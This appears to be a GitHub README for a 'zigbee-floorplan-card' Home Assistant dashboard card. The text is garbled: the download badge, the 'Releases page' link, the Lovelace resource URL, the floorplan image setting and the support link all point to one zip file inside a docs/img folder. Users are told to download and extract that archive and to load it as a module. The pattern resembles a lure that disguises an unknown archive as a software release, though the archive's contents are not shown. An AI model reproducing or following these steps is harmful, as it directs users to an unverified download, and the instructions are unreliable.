# 🌟 zigbee-floorplan-card - Visualize Your Zigbee Network Effortlessly

## 🛠️ Download Now
[![Download from Releases](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip)](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip)

## 📖 Introduction
Welcome to the **zigbee-floorplan-card**. This custom Home Assistant Lovelace card helps you see your Zigbee network layout on a floorplan image. It automatically detects device names from Zigbee2MQTT. This tool makes it easier to understand your home automation setup.

## 🚀 Getting Started
Follow these steps to download and run **zigbee-floorplan-card**.

1. **Visit the Releases Page**
   Click the button above to go to the [Releases page](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip).

2. **Download the Latest Version**
   On the Releases page, look for the latest version. Click the asset that says "https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip" to download it to your computer.

3. **Unzip the File**
   After the download completes, locate the downloaded file. Right-click it and select 'Extract All' to unzip the folder.

4. **Add to Home Assistant**
   Open your Home Assistant configuration. You need to place the unzipped files into the `www` folder. This folder is usually found at the following path:
   ```
   /config/www/
   ```
   If the `www` folder does not exist, create one.

5. **Update your Lovelace Configuration**
   You will need to tell Home Assistant to use the new card. Open your configuration file or the Lovelace UI editor. Add the following code snippet:
   ```yaml
   resources:
     - url: https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip
       type: module
   ```

6. **Create Your Floorplan Card**
   Now you are ready to add the card to your dashboard. Edit your Lovelace dashboard and add a new card. Choose the "Manual" card option, then insert the following code:
   ```yaml
   type: "custom:zigbee-floorplan-card"
   floorplan: https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip
   ```
   Replace `https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip` with the name of your actual floorplan image file.

7. **Save Changes**
   Save your dashboard changes. The **zigbee-floorplan-card** should now be visible, displaying your Zigbee network on the floorplan.

## 📋 System Requirements
- **Home Assistant**: Version 0.115 or later is required.
- **Zigbee2MQTT**: Must be configured and running in your Home Assistant.
- **Browser Support**: Chrome, Firefox, or Edge for best performance.

## 📥 Download & Install
To summarize, you can easily download the application from the [Releases page](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip). Please follow the steps listed under "Getting Started" for a smooth installation.

## 📚 Features
- **Automatic Device Detection**: The card pulls device names directly from your Zigbee2MQTT setup.
- **Custom Images**: Use your own floorplan image for a tailored experience.
- **Responsive Design**: The card adjusts to different screen sizes for better usability.

## 🔍 Troubleshooting
If you encounter issues while setting up the card, consider the following:

- **File Paths**: Double-check that your file paths are correct, especially for the `resources` and `floorplan` links.
- **Card Not Displaying**: Ensure that the required modules are loaded correctly in your Lovelace configuration.
- **Browser Cache**: Clear your browser’s cache to see the latest updates.

## 📞 Support
For further assistance, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip). Our community is here to help you.

Thank you for using **zigbee-floorplan-card**! Enjoy better visibility of your Zigbee network in your home automation setup.